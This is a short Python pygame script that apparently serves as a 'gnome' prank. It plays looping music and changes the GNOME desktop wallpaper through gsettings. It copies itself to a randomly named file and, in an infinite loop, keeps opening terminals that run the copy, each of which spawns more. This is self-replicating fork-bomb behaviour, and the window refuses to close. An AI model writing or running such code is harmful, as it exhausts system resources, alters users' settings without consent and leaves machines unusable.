import os
import pygame
import random
pygame.init()
pygame.mixer.init()
pygame.mixer.music.load("gnome.mp3")
pygame.mixer.music.play(-1)
width, height = 264, 358
gnomefield = pygame.display.set_mode((width,height))
file_location = os.path.abspath(os.path.dirname(__file__))
new_name = str(random.randrange(1,999999999999999))+".py"
os.system("touch {}".format(new_name))
os.system("cp {} {}/{}".format(__file__,file_location,new_name))
os.system("gsettings set org.gnome.desktop.background picture-uri file://{}".format(file_location+"/gnomedya.png"))
while True:
  for event in pygame.event.get():
    if event.type == pygame.QUIT:
      print("You can't escape the Gnome!")
  gnomefield.blit(pygame.image.load("gnome.png"),(0,0))
  os.system("gnome-terminal -x python {}/{}".format(file_location,new_name))
  pygame.display.update()
